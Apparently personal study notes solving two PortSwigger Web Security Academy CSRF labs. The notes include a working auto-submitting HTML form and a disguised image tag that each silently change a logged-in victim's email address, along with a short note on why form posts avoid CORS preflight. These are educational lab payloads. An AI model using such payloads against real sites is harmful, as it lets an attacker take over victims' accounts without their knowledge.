# CSRF

- https://portswigger.net/web-security/csrf#how-to-construct-a-csrf-attack
- https://tools.nakanosec.com/csrf/

## CSRF vulnerability with no defenses

Check email change request using burp and generate csrf form using https://tools.nakanosec.com/csrf/

Due to https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests:

```
Some requests don't trigger a CORS preflight. Those are called simple requests from the obsolete CORS spec, though the Fetch spec (which now defines CORS) doesn't use that term.

The motivation is that the <form> element from HTML 4.0 (which predates cross-site XMLHttpRequest and fetch) can submit simple requests to any origin, so anyone writing a server must already be protecting against cross-site request forgery (CSRF).
```

So it is prefered to use `<form>` because it "bypasses" `CORS`

```
<html>
	<body>
		<form method="POST" action="https://0a8200510435839080008f1a003a008d.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="pwned@email.com"/>
			<input type="submit" value="Submit">
		</form>
        <script>
            document.forms[0].submit()
        </script>
	</body>
<html>
```

## CSRF where token validation depends on request method

Application allow changing email via GET request and does not validate CSRF tokens in GET requests.

Deliver to victim:
```
<img src="https://0afd00f40477303a87a067c200da00ec.web-security-academy.net/my-account/change-email?email=pwned%40email.com" alt="Cute-cats.png"/>
```
